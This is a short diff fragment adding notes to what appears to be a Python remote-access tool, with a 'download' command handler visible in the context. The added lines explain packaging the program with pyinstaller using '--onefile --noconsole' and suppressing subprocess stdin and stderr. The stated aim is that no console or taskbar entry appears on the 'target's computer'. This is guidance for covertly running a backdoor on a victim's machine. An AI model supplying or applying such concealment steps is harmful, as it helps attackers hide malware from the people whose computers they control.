@@ -562,6 +562,12 @@ if command[0] == 'download':
         print('Errors have occured')
        
   
+in windows - pip install pyinstaller
+the binary will run irrespective of whether or not python is installed. but the commandline will remain open in targets computer
+until connection is closed. use sys.exit() while exiting else target will see error related to keyboard interrupt.
+pyinstaller.exe pgm.py --onefile --noconsole    #last argument to avoid cmdline popping up at target during run time.
+but functions like check_output makes use of terminals for output. in arguments, give stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
+it doesnt show up on taskbar as well.   
         
    
    
